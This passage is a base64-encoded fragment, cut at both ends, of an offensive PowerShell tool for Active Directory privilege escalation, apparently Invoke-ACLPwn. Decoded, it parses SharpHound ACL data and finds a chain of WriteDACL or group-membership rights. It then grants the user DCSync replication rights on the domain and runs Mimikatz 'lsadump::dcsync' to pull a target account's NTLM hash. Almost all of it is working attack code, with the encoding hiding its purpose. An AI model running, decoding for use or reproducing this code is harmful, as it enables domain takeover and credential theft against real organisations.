mlwRmlsZUxvY2F0aW9uIC1leHRyYWN0cGF0aCAkcGFyZW50Rm9sZGVyICAgIAogICAgJHNoYXJwSG91bmRPdXRwdXRGaWxlcyA9IEdldC1DaGlsZGl0ZW0gLVBhdGggJHBhcmVudEZvbGRlciAtRmlsdGVyICIqLmpzb24iCgogICAgIyBLZWVwIHRyYWNrIG9mIGZpbGUgdGhhdCB3ZXJlIGNyZWF0ZWQuIFdlIHdhbnQgdG8gcmVtb3ZlIHRoZXNlIGZpbGVzIGxhdGVyCiAgICAkZ2xvYmFsOmZpbGVzQ3JlYXRlZCArPSAkc2hhcnBIb3VuZFppcEZpbGVMb2NhdGlvbgogICAgJHNoYXJwSG91bmRPdXRwdXRGaWxlcy5GdWxsTmFtZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZ2xvYmFsOmZpbGVzQ3JlYXRlZCArPSAkXwogICAgfQogICAgCiAgICAkcmVzdWx0ID0gQCgpCiAgICBmb3JlYWNoICgkanNvbkZpbGUgaW4gJHNoYXJwSG91bmRPdXRwdXRGaWxlcyl7CgogICAgICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgJGpzb25GaWxlLkZ1bGxOYW1lICAgICAgICAKCiAgICAgICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRjb250ZW50KSl7CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgfQoKICAgICAgICAkdG1wID0gQ29udmVydEZyb20tSnNvbiAkY29udGVudCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQoKICAgICAgICAjIGl0ZXJhdGUgdGhyb3VnaCBvYmplY3RzCiAgICAgICAgJG9iamVjdFR5cGUgPSAkdG1wLm1ldGEudHlwZQogICAgICAgIGZvcmVhY2ggKCRpIGluICR0bXAuIiRvYmplY3RUeXBlIil7CiAgICAgICAgICAgIAogICAgICAgICAgICAkb2JqZWN0TmFtZSA9ICRpLk5hbWUKCiAgICAgICAgICAgICMgSXRlcmF0ZSB0aHJvdWdoIEFDRXMKICAgICAgICAgICAgZm9yZWFjaCAoJGEgaW4gJGkuQWNlcykgeyAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJHJlc3VsdCArPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAewogICAgICAgICAgICAgICAgICAgICAgICAnT2JqZWN0TmFtZScgICAgICAgICAgICA9ICRvYmplY3ROYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICdPYmplY3RUeXBlJyAgICAgICAgICAgID0gJG9iamVjdFR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJ1ByaW5jaXBhbE5hbWUnICAgICAgICAgPSAkYS5QcmluY2lwYWxOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICdQcmluY2lwYWxUeXBlJyAgICAgICAgID0gJGEuUHJpbmNpcGFsVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAnQWN0aXZlRGlyZWN0b3J5UmlnaHRzJyA9ICRhLlJpZ2h0TmFtZQogICAgICAgICAgICAgICAgICAgICAgICAnQUNFVHlwZScgICAgICAgICAgICAgICA9ICRhLkFjZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJ0FjY2Vzc0NvbnRyb2xUeXBlJyAgICAgPSAnQWNjZXNzQWxsb3dlZCcgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICByZXR1cm4gJHJlc3VsdAp9CgpmdW5jdGlvbiBVbnppcC1BcmNoaXZlIHsKICAgICN0aHg6IGh0dHBzOi8vd3d3LnNhb3RuLm9yZy91bnppcC1maWxlLXBvd2Vyc2hlbGwvCiAgICBwYXJhbSggW3N0cmluZ10kemlwYXJjaGl2ZSwgW3N0cmluZ10kZXh0cmFjdHBhdGggKQogICAgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5aaXBGaWxlXTo6RXh0cmFjdFRvRGlyZWN0b3J5KCAkemlwYXJjaGl2ZSwgJGV4dHJhY3RwYXRoICkKfQoKCmZ1bmN0aW9uIEFkZC1SZXBsaWNhdGlvblBhcnRuZXIgewogICAgCiAgICAjIFJldHJpZXZlIFNJRCBiYXNlZCBvbiBhY3R1YWwgaW5mbyBmcm9tIHRoZSBkb21haW4KICAgICR1c2VyQWRPYmogPSBHZXQtQXR0ckZvckFET2JqZWN0IC1vYmplY3ROYW1lICRnbG9iYWw6bGRhcENvbm5JbmZvLnVzZXJuYW1lIC1wcm9wcyAnb2JqZWN0U2lkJwogICAgJHVzZXJTSUQgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyICR1c2VyQWRPYmpbJ29iamVjdFNpZCddWzBdLCAwICAgIAoKICAgICMgR2V0IEdVSUQgZm9yICdyZXBsaWNhdGluZyBjaGFuZ2VzIChhbGwpJwogICAgJHJlcGxpY2F0aW9uR1VJRCA9IChHZXQtRXh0ZW5kZWRSaWdodEJ5TmFtZSAtZGlzcGxheW5hbWUgJ1JlcGxpY2F0aW5nIERpcmVjdG9yeSBDaGFuZ2VzJykKICAgICRyZXBsaWNhdGlvbkFsbEdVSUQgPSAoR2V0LUV4dGVuZGVkUmlnaHRCeU5hbWUgLWRpc3BsYXluYW1lICdSZXBsaWNhdGluZyBEaXJlY3RvcnkgQ2hhbmdlcyBBbGwnKQoKICAgIGlmICgkV2hhdElmKXsKICAgICAgICBXcml0ZS1TdGF0dXMgIldoYXRJZjogU2V0dGluZyAnUmVwbGljYXRpbmcgRGlyZWN0b3J5IENoYW5nZXMnIHBlcm1pc3Npb25zIGZvciB1c2VyICQoJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUpIgogICAgICAgIFdyaXRlLVN0YXR1cyAiV2hhdElmOiBTZXR0aW5nICdSZXBsaWNhdGluZyBEaXJlY3RvcnkgQ2hhbmdlcyBBbGwnIHBlcm1pc3Npb25zIGZvciB1c2VyICQoJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUpIgogICAgICAgIHJldHVybgogICAgfQogICAgCiAgICAkaW50ZWdyYXRlZExvZ2luID0gJGdsb2JhbDpsZGFwQ29ubkluZm8uSW50ZWdyYXRlZF9Mb2dpbgogICAgJHVzZXJTSURTdHJpbmcgICA9ICR1c2VyU0lELlZhbHVlCiAgICAkcmlnaHRUeXBlICAgICAgID0gJ0V4dGVuZGVkUmlnaHQnCiAgICAkYWN0aW9uICAgICAgICAgID0gJ0FsbG93JwoKICAgICMgQnVpbGQgdXAgdHdvIEFDRXMKICAgICRudWxsR1VJRCA9IFtndWlkXScwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAnCiAgICAkaW5oZXJpdGFuY2VUeXBlID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlTZWN1cml0eUluaGVyaXRhbmNlXTo6Tm9uZQogICAgJHJlcGxBQ0UgICAgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlICR1c2VyU0lELCAkcmlnaHRUeXBlLCAkYWN0aW9uLCAkcmVwbGljYXRpb25HVUlELCAgICAkaW5oZXJpdGFuY2VUeXBlLCAkbnVsbEdVSUQKICAgICRyZXBsQWxsQUNFID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAkdXNlclNJRCwgJHJpZ2h0VHlwZSwgJGFjdGlvbiwgJHJlcGxpY2F0aW9uQWxsR1VJRCwgJGluaGVyaXRhbmNlVHlwZSwgJG51bGxHVUlECiAgICAKICAgICMgU3RvcmUgYXJyYXlzCiAgICAkZ2xvYmFsOkFDRXMgKz0gJHJlcGxBQ0UKICAgICRnbG9iYWw6QUNFcyArPSAkcmVwbEFsbEFDRQoKICAgIGlmICgtbm90ICRpbnRlZ3JhdGVkTG9naW4pewogICAgICAgICMgQnVpbGQgdXAgcGFyYW1ldGVycwogICAgICAgICRzY3JpcHRQYXJhbSA9ICgiLXVzZXJTSURTdHJpbmcgYCJ7MH1gIiAtcmlnaHRUeXBlIGAiezF9YCIgLWFjdGlvbiBgInsyfWAiIiAtZiBgCiAgICAgICAgICAgICAgICAgICAgICAgICR1c2VyU0lEU3RyaW5nLCAkcmlnaHRUeXBlLCAkYWN0aW9uKQoKICAgICAgICBpZiAoJGdsb2JhbDpsZGFwQ29ubkluZm8uSW50ZWdyYXRlZF9Mb2dpbil7CiAgICAgICAgICAgICRzY3JpcHRQYXJhbSArPSAiIC1pbnRlZ3JhdGVkTG9naW4iCiAgICAgICAgfQoKICAgICAgICAjIEFwcGx5IFJlcGxpY2F0aW9uIENoYW5nZXMgQUNFCiAgICAgICAgJF9wYXJhbSA9ICRzY3JpcHRQYXJhbSArICIgLXByb3BlcnR5R1VJRCBgIiQoJHJlcGxpY2F0aW9uR1VJRClgIiIgICAgCiAgICAgICAgJHNSZXN1bHQgPSBTdGFydC1QU1NjcmlwdCAtc2NyaXB0TG9jICRnbG9iYWw6QUNFU2NyaXB0IC1zY3JpcHRQYXJhbSAkX3BhcmFtIAoKICAgICAgICBpZiAoJHNSZXN1bHQgLW5lICdEb25lJykgIHsKICAgICAgICAgICAgV3JpdGUtQmFkICdFcnJvciBvY2N1cmVkIHdoaWxlIHNldHRpbmcgQUNMJwogICAgICAgICAgICBXcml0ZS1CYWQgJHNSZXN1bHQKICAgICAgICAgICAgcmV0dXJuICRmYWxzZQogICAgICAgIH0gICAgICAgICAKICAgICAgICAKICAgICAgICAjIEFwcGx5IFJlcGxpY2F0aW9uIENoYW5nZXMgQWxsIEFDRQogICAgICAgICRzUmVzdWx0ID0gW3N0cmluZ106OkVtcHR5CiAgICAgICAgJF9wYXJhbSAgPSAkc2NyaXB0UGFyYW0gKyAiIC1wcm9wZXJ0eUdVSUQgYCIkKCRyZXBsaWNhdGlvbkFsbEdVSUQpYCIiICAgIAogICAgICAgICRzUmVzdWx0ID0gU3RhcnQtUFNTY3JpcHQgLXNjcmlwdExvYyAkZ2xvYmFsOkFDRVNjcmlwdCAtc2NyaXB0UGFyYW0gJF9wYXJhbSAKCiAgICAgICAgaWYgKCRzUmVzdWx0IC1uZSAnRG9uZScpICB7CiAgICAgICAgICAgIFdyaXRlLUJhZCAnRXJyb3Igb2NjdXJlZCB3aGlsZSBzZXR0aW5nIEFDTCcKICAgICAgICAgICAgcmV0dXJuICRmYWxzZQogICAgICAgIH0gICAgCgogICAgICAgIHJldHVybiAkdHJ1ZQogICAgfSBlbHNlIHsKCiAgICAgICAgIyBSZXRyaWV2ZSBkb21haW4gb2JqZWN0CiAgICAgICAgJGRvbWFpbkROID0gR2V0LURvbWFpbkROCiAgICAgICAgJGRvbWFpbkRpckVudHJ5ID0gR2V0LURpckVudHJ5ICRkb21haW5ETgogICAgICAgIAogICAgICAgICMgU2V0IHNlY3VyaXR5bWFza3MgZm9yIERBQ0wgb25seQogICAgICAgICRzZWNPcHRpb25zID0gJGRvbWFpbkRpckVudHJ5LmdldF9PcHRpb25zKCkKICAgICAgICAkc2VjT3B0aW9ucy5TZWN1cml0eU1hc2tzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6RGFjbAogICAgICAgICRkb21haW5EaXJFbnRyeS5SZWZyZXNoQ2FjaGUoKQoKICAgICAgICAjIEFkZCBvdXIgbmV3IGNyZWF0ZWQgQUNFcwogICAgICAgICRkb21haW5EaXJFbnRyeS5nZXRfT2JqZWN0U2VjdXJpdHkoKS5BZGRBY2Nlc3NSdWxlKCRyZXBsQUNFKQogICAgICAgICRkb21haW5EaXJFbnRyeS5nZXRfT2JqZWN0U2VjdXJpdHkoKS5BZGRBY2Nlc3NSdWxlKCRyZXBsQWxsQUNFKQogICAgICAgICRkb21haW5EaXJFbnRyeS5Db21taXRDaGFuZ2VzKCkKICAgIAogICAgICAgICRkb21haW5EaXJFbnRyeS5kaXNwb3NlKCkKCiAgICAgICAgcmV0dXJuICR0cnVlCiAgICB9Cn0KCmZ1bmN0aW9uIEludm9rZS1EQ1N5bmMgKCRtaW1pS2F0ekxvY2F0aW9uLCAkYWNjb3VudFRvUHduKSB7CiAgICAKICAgIGlmICgtbm90IChUZXN0LVBhdGggJG1pbWlLYXR6TG9jYXRpb24pKSB7CiAgICAgICAgV3JpdGUtQmFkICdNaW1pa2F0eiBub3QgZm91bmQuIFF1aXR0aW5nLicKICAgICAgICByZXR1cm4KICAgIH0KCiAgICAkYXJnViA9ICJgImxzYWR1bXA6OmRjc3luYyAvZG9tYWluOiQoJGdsb2JhbDpsZGFwQ29ubkluZm8uZG9tYWluKSAvdXNlcjokYWNjb3VudFRvUHduQCQoJGdsb2JhbDpsZGFwQ29ubkluZm8uZG9tYWluKWAiIGV4aXQiCgogICAgIyBXZSBjYW5ub3QgZ2V0IHRoZSByZXN1bHRzIGZyb20gbWltaWthdHogaXRzZWxmICh3ZSBuZWVkIHRvIGRlIFxyXG4gYWZ0ZXIgaXNzdWluZyBsb2csIHdoaWNoIGlzIG5vdCBwb3NzaWJsZSBhdG0pCiAgICAjIFdyaXRlIGEgYmF0Y2hmaWxlIHRoYXQgZG9lcyB0aGUgc2FtZQogICAgJG91dHB1dF9mTmFtZSA9ICIkKFtTeXN0ZW0uRGF0ZVRpbWVdOjpOb3cuVG9GaWxlVGltZSgpKV9taW1pT3V0cHV0LnR4dCIKICAgICRvdXRwdXRfYmF0Y2hGaWxlID0gIiQoW1N5c3RlbS5EYXRlVGltZV06Ok5vdy5Ub0ZpbGVUaW1lKCkpX21pbWkuYmF0IgoKICAgICRnbG9iYWw6ZmlsZXNDcmVhdGVkICs9ICRvdXRwdXRfZk5hbWUKICAgICRnbG9iYWw6ZmlsZXNDcmVhdGVkICs9ICRvdXRwdXRfYmF0Y2hGaWxlCiAgICAiYCIkKCRtaW1pS2F0ekxvY2F0aW9uKWAiICRhcmdWID4gJG91dHB1dF9mTmFtZSIgfCBPdXQtRmlsZSAkb3V0cHV0X2JhdGNoRmlsZSAtRW5jb2RpbmcgYXNjaWkKCiAgICBJbnZva2UtQ21kIC1jbWQgJ0M6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZScgLWFyZ1YgIiAvYyAkb3V0cHV0X2JhdGNoRmlsZSIKCiAgICAjIHRoZSBpbnZva2UtcnVuYXMgcnVucyBhc3luYywgd2FpdCBmb3IgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZC4KICAgICRmaWxlQmVpbmdDcmVhdGVkID0gJHRydWUKICAgIGRvIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRvdXRwdXRfZk5hbWUpKSB7CiAgICAgICAgICAgIFN0YXJ0LVNsZWVwKDEpICAgICAgICAgICAgICAgIAogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRmaWxlQmVpbmdDcmVhdGVkID0gJGZhbHNlCiAgICAgICAgfQogICAgICAgIAogICAgfXdoaWxlICgkZmlsZUJlaW5nQ3JlYXRlZCkKCiAgICAkcmVzdWx0ID0gR2V0LWNvbnRlbnQgJG91dHB1dF9mTmFtZQogICAgJHJIYXNoID0gJHJlc3VsdCB8IFdoZXJlLU9iamVjdCB7JF8gLW1hdGNoICdIYXNoIE5UTE1cOlxzKD88bnRsbV9oYXNoPi4rKSd9CgogICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRySGFzaCkpIHsKICAgICAgICAKICAgICAgICBXcml0ZS1CYWQgJ0RpZCBub3QgZmluZCBOVExNIGhhc2ggZHVlIHRvIGZvbGxvd2luZyBlcnJvcjonCiAgICAgICAgV3JpdGUtQmFkICgkcmVzdWx0IHwgV2hlcmUtT2JqZWN0IHskXy5TdGFydHN3aXRoKCdFUlJPUicpfSkKICAgICAgICByZXR1cm4KICAgIH0KCiAgICAkbnRsbUhBU0ggPSAkckhhc2guU3BsaXQoJyAnKVstMV0KICAgIHJldHVybiAkbnRsbUhBU0gKfQoKZnVuY3Rpb24gUmVtb3ZlLVJlcGxpY2F0aW9uUGFydG5lciB7CiAgICAKICAgICMgUmV0cmlldmUgZG9tYWluIG9iamVjdAogICAgJGRvbWFpbkROID0gR2V0LURvbWFpbkROCiAgICAkZG9tYWluRGlyRW50cnkgPSBHZXQtRGlyRW50cnkgJGRvbWFpbkROCgogICAgIyBTZXQgc2VjdXJpdHltYXNrcyBmb3IgREFDTCBvbmx5CiAgICAkc2VjT3B0aW9ucyA9ICRkb21haW5EaXJFbnRyeS5nZXRfT3B0aW9ucygpCiAgICAkc2VjT3B0aW9ucy5TZWN1cml0eU1hc2tzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6RGFjbAoKICAgICMgQWRkIG91ciBuZXcgY3JlYXRlZCBBQ0VzCiAgICBmb3JlYWNoICgkYSBpbiAkZ2xvYmFsOkFDRXMpIHsKICAgICAgICBbdm9pZF0kZG9tYWluRGlyRW50cnkuZ2V0X09iamVjdFNlY3VyaXR5KCkuUmVtb3ZlQWNjZXNzUnVsZSgkYSkKICAgIH0KICAgIAogICAgJGRvbWFpbkRpckVudHJ5LkNvbW1pdENoYW5nZXMoKSAgIAogICAgJGRvbWFpbkRpckVudHJ5LmRpc3Bvc2UoKQp9CgpmdW5jdGlvbiBSZXBsLVB3biB7CgogICAgIyBBZGQgb3VyIGRlYXIgc2VsZiBhcyByZXBsaWNhdGlvbiBwYXJ0bmVyCiAgICBXcml0ZS1TdGF0dXMgJ0FkZGluZyBvdXJzZWxmIGFzIHBvdGVudGlhbCByZXBsaWNhdGlvbiBwYXJ0bmVyLi4uJwogICAgaWYgKC1ub3QgKEFkZC1SZXBsaWNhdGlvblBhcnRuZXIpKXsKICAgICAgICByZXR1cm4KICAgIH0KICAgIFdyaXRlLUdvb2QgJ1N1Y2Nlc2Z1bCEgV2UgY2FuIG5vdyBzdGFydCByZXBsaWNhdGluZyBzb21lIHN0dWZmLCBob2xkIG9uLi4uJwoKICAgICMgSW52b2tlIE1pbWlrYXR6LCByZWFkIGNvbnNvbGUgb3V0cHV0CiAgICBpZiAoLW5vdCAkTm9EQ1N5bmMpewogICAgICAgICRtaW1pUmVzdWx0ID0gSW52b2tlLURDU3luYyAtbWltaUthdHpMb2NhdGlvbiAkbWltaUthdHpMb2NhdGlvbiAtYWNjb3VudFRvUHduICQoJHVzZXJBY2NvdW50VG9Qd24pCgogICAgICAgIGlmICgtbm90IFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRtaW1pUmVzdWx0KSkgewogICAgICAgICAgICBXcml0ZS1Hb29kICJHb3QgaGFzaCBmb3IgJyQoJHVzZXJBY2NvdW50VG9Qd24pJyBhY2NvdW50OiAkbWltaVJlc3VsdCIKICAgICAgICB9CiAgICB9Cn0KCiNlbmRyZWdpb24KCiNyZWdpb24gU3RydWN0dXJlcwoKCgojIGdsb2JhbCB2YXJpYWJsZSB3aXRoIGZpbGVzIHRoYXQgYXJlIGNyZWF0ZWQgb24gcnVudGltZQokZ2xvYmFsOmZpbGVzQ3JlYXRlZCA9IEAoKQoKIyBDb250YWlucyBncm91cHMgdGhhdCB0aGUgdXNlcndhcyBhZGRlZCB0bwokZ2xvYmFsOkdyb3VwQWRkZWQgICA9IEAoKQojZW5kcmVnaW9uCgojIGNoZWNrIGlmIHdlIGNhbiBydW4gdGhlIHNjcmlwdAppZiAoLW5vdCAoQ2hlY2stRW52KSkgewogICAgR2V0LUhlbHAKICAgIHJldHVybgp9CgojIEdldCBncm91cG1lbWJlcnNoaXAgZm9yIHN1cHBsaWVkIHVzZXJhY2NvdW50CldyaXRlLVN0YXR1cyAiUmV0cmlldmluZyBncm91cG1lbWJlcnNoaXAgZm9yIHVzZXIgJCgkZ2xvYmFsOmxkYXBDb25uSW5mby51c2VybmFtZSkuLi4iCiRncm91cE1lbWJlcnNoaXAgPSBHZXQtR3JvdXBtZW1iZXJzaGlwIC1vYmpOYW1lICQoJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUpIC1yZWN1cnNpdmUgJHRydWUKV3JpdGUtU3RhdHVzICJVc2VyICckKCRnbG9iYWw6bGRhcENvbm5JbmZvLnVzZXJuYW1lKScgaXMgbWVtYmVyIG9mICQoJGdyb3VwTWVtYmVyc2hpcCB8IE1lYXN1cmUtT2JqZWN0IHwgRm9yRWFjaC1PYmplY3QgeyRfLkNvdW50fSkgZ3JvdXAocykiCgojIEdldCBvYmplY3QgY2xhc3MgZnJvbSBzY2hlbWEKV3JpdGUtU3RhdHVzICJHZXR0aW5nIHNjaGVtYSBjbGFzc2VzLi4uIgokZ2xvYmFsOkFESW5mby5zY2hlbWFDbGFzc2VzID0gR2V0LVNjaGVtYUNsYXNzZXMKV3JpdGUtU3RhdHVzICJGb3VuZCAkKCRnbG9iYWw6QURJbmZvLnNjaGVtYUNsYXNzZXMuQ291bnQpIHNjaGVtYSBjbGFzc2VzIgoKIyBHZXQgdHJhbnNsYXRpb24gZm9yIGV4dGVuZGVkIHJpZ2h0cwpXcml0ZS1TdGF0dXMgIkdldHRpbmcgZXh0ZW5kZWQgcmlnaHRzIGZyb20gc2NoZW1hLi4uIgokZ2xvYmFsOkFESW5mby5leHRlbmRlZFJpZ2h0cyA9IEdldC1FeHRlbmRlZFJpZ2h0cwpXcml0ZS1TdGF0dXMgIkZvdW5kICQoJGdsb2JhbDpBREluZm8uZXh0ZW5kZWRSaWdodHMuQ291bnQpIGV4dGVuZGVkIHJpZ2h0cyIKCiMgUnVuIFNoYXJwaG91bmQgdG8gY29sbGVjdCBBQ0wgb2YgdGhlIHRhcmdldCBkb21haW4KJGlzbmV3U2hhcnBIb3VuZFZlcnNpb24gPSBJcy1OZXdTaGFycGhvdW5kVmVyc2lvbiAtc2hhcnBob3VuZExvY2F0aW9uICRTaGFycEhvdW5kTG9jYXRpb24KJGFjbElucHV0UGF0aCA9IEdldC1TaGFycEhvdW5kQUNMIC1zaGFycEhvdW5kTG9jYXRpb24gJHNoYXJwSG91bmRMb2NhdGlvbiAgLWlzTmV3VmVyc2lvbiAkaXNuZXdTaGFycEhvdW5kVmVyc2lvbgokZ2xvYmFsOmZpbGVzQ3JlYXRlZCArPSAkYWNsUGF0aAoKaWYgKCRhY2xJbnB1dFBhdGggLWVxICRudWxsKSB7CiAgICByZXR1cm4KfQoKIyBJbXBvcnQgY3N2CmlmICgkaXNuZXdTaGFycEhvdW5kVmVyc2lvbil7CiAgICAkQUNMID0gSW1wb3J0LUpzb25BQ0wgLXNoYXJwSG91bmRaaXBGaWxlTG9jYXRpb24gJGFjbElucHV0UGF0aAp9IGVsc2V7CiAgICAkQUNMID0gSW1wb3J0LUNTVkFDTCAtY3N2TG9jYXRpb24gJGFjbElucHV0UGF0aAp9CldyaXRlLVN0YXR1cyAiRm91bmQgJCgkQUNMLkNvdW50KSBBQ0xzIgoKIyBJdGVyYXRlIHdyaXRlREFDTCBhbmQgZnVsbGNvbnRyb2wgcGVybWlzc2lvbnMgb24gdGhlIGRvbWFpbiBvYmplY3QKJGRvbWFpbk9iamVjdFR5cGVOYW1lID0gImRvbWFpbiIKaWYgKCRpc25ld1NoYXJwSG91bmRWZXJzaW9uKSB7CiAgICAkZG9tYWluT2JqZWN0VHlwZU5hbWUgPSAiZG9tYWlucyIgIyBkdW5ubyBpZiB0eXBvPwp9CgokZG9tYWluQUNMICAgICAgID0gJEFDTCB8IFdoZXJlLU9iamVjdCB7JF8uT2JqZWN0VHlwZSAtZXEgJGRvbWFpbk9iamVjdFR5cGVOYW1lfQokd3JpdGVEQUNMRG9tYWluID0gJGRvbWFpbkFDTCB8IFdoZXJlLU9iamVjdCB7JF8uQWN0aXZlRGlyZWN0b3J5UmlnaHRzIC1lcSAnV3JpdGVEYWNsJ30KJHdyaXRlREFDTERvbWFpbiArPSAkZG9tYWluQUNMIHwgV2hlcmUtT2JqZWN0IHskXy5BY3RpdmVEaXJlY3RvcnlSaWdodHMgLWVxICdHZW5lcmljQWxsJ30KCiMgQXJyYXlzIHdpdGggcGVybWlzc2lvbnMKJGN1cnJXcml0ZURhY2xQZXJtID0gQCgpCgojIENoZWNrIGlmIHdlIGhhdmUgd3JpdGVEQUNMIHBlcm1pc3Npb25zCmZvcmVhY2ggKCRnIGluICRncm91cE1lbWJlcnNoaXApewogICAgJGN1cnJXcml0ZURhY2xQZXJtICs9ICR3cml0ZURBQ0xEb21haW4gfCBXaGVyZS1PYmplY3QgeyRfLlByaW5jaXBhbE5hbWUuVG9TdHJpbmcoKS5Ub0xvd2VyKCkgLWxpa2UgIiQoJGcuTlRBY2NvdW50LlRvTG93ZXIoKSkqIn0KfQoKaWYgKCRjdXJyV3JpdGVEYWNsUGVybS5Db3VudCAtZ2UgMSkgewogICAgV3JpdGUtR29vZCAnR290IFdyaXRlREFDTCBwZXJtaXNzaW9ucy4nCgogICAgUmVwbC1Qd24KCiAgICAjIERvbmUuCiAgICBJbnZva2UtQ2xlYW51cAogICAgcmV0dXJuCn0KCiMgd2l0aCB0aGVzZSBwZXJtaXNzaW9ucyB3ZSBjYW4gcG9zc2libHkgcHduIHZpYSBhbm90aGVyIHdheQojJFB3blBlcm1pc3Npb25zID0gQCgnR2VuZXJpY0FsbCcsJ1dyaXRlUHJvcGVydHknLCdvd25lcicsJ1dyaXRlT3duZXInKQojJFB3bkF0dHJpYnV0ZXMgID0gQCgnbWVtYmVyJywnb3duZXInLCdXcml0ZURhY2wnKQoKV3JpdGUtU3RhdHVzICdQYXJzaW5nIEFDTC4gVGhpcyBtaWdodCB0YWtlIGEgd2hpbGUuLi4nCiRwd25QYXRoID0gR2V0LVB3bkNoYWluIC1vYmpBQ0wgJHdyaXRlREFDTERvbWFpbiAtZ3JvdXBNZW1iZXJzaGlwICRncm91cE1lbWJlcnNoaXAKCmlmICgkcHduUGF0aCAtZXEgJG51bGwpewogICAgV3JpdGUtU3RhdHVzICdObyBjaGFpbiBmb3VuZCA6KCcKICAgIHJldHVybgp9IAoKV3JpdGUtR29vZCAnRm91bmQgY2hhaW4hJwoKIyBjaGFpbiBpcyBpbiBjaHJvbm9sb2dpY2FsIG9yZGVyCmZvcmVhY2ggKCRjIGluICRwd25QYXRoKSB7CiAgIAogICAgaWYgKCRjLlR5cGUgLWVxICdBQ0wnKSB7CiAgICAgICAgICAgCiAgICAgICAgJGF0dHIgICAgPSAkYy5PYmplY3QuQUNFVHlwZQogICAgICAgICRhZFJpZ2h0ID0gJGMuT2JqZWN0LkFjdGl2ZURpcmVjdG9yeVJpZ2h0cwoKICAgICAgICAjIENhbiB3ZSBtb2RpZnkgZ3JvdXBtZW1iZXJzaGlwPwogICAgICAgIGlmICgoJGF0dHIgLWVxICdNZW1iZXInIC1hbmQgJGFkUmlnaHQgLWVxICdXcml0ZVByb3BlcnR5JykgLW9yICRhZFJpZ2h0IC1lcSAnR2VuZXJpY0FsbCcpeyAgICAgICAgICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgIyBHZXQgZGlzdGluZ3Vpc2hlZE5hbWUgCiAgICAgICAgICAgICRncm91cEROID0gR2V0LURpc3Rpbmd1aXNoZWROYW1lRm9yT2JqZWN0IC1vYmogJCgkYy5PYmplY3QuT2JqZWN0TmFtZSkKCiAgICAgICAgICAgICMgRHJ5IHJ1bgogICAgICAgICAgICBpZiAoJFdoYXRJZikgewogICAgICAgICAgICAgICAgV3JpdGUtU3RhdHVzICJXaGF0SWY6IEFkZGVkIHVzZXIgJyQoJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUpJyB0byBncm91cCAkZ3JvdXBETiIgCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIFRPRE86IENyZWRlbnRpYWxzIHJlbWFpbiBpbiBtZW1vcnkuIEZsdXNoIGNyZWRlbnRpYWxzCiAgICAgICAgICAgICMgU3RhcnQgbmV3IHByb2Nlc3MgcHJvY2VzcyBhbmQgY2FsbCBzY3JpcHQgdG8gYWRkIHVzZXIgdG8gZ3JvdXAgaWYgd2UncmUgbm90IHVzaW5nIGludGVncmF0ZWQgbG9naW4KICAgICAgICAgICAgaWYgKCRnbG9iYWw6bGRhcENvbm5JbmZvLkludGVncmF0ZWRfTG9naW4pewogICAgICAgICAgICAgICAgJHNSZXN1bHQgPSBTZXQtR3JvdXBNZW1iZXJzaGlwIC1ncm91cEROICRncm91cEROCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkc1Jlc3VsdCA9IFN0YXJ0LVBTU2NyaXB0IC1zY3JpcHRMb2MgJGdsb2JhbDpBZGRUb0dyb3VwU2NyaXB0RmlsZSAtc2NyaXB0UGFyYW0gIi1ncm91cEROIGAiJGdyb3VwRE5gIiAtdXNlckROIGAiJCgkZ2xvYmFsOmxkYXBDb25uSW5mby5kaXN0aW5ndWlzaGVkTmFtZSlgIiIgIAogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJHNSZXN1bHQgLW5lICdEb25lJykgewogICAgICAgICAgICAgICAgV3JpdGUtQmFkICJFcnJvciBhZGRpbmcgdXNlciB0byBncm91cDogJCgkZ3JvdXBETikiCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1TdGF0dXMgIkFkZGVkIHVzZXIgJyQoJGdsb2JhbDpsZGFwQ29ubkluZm8udXNlcm5hbWUpJyB0byBncm91cCAkZ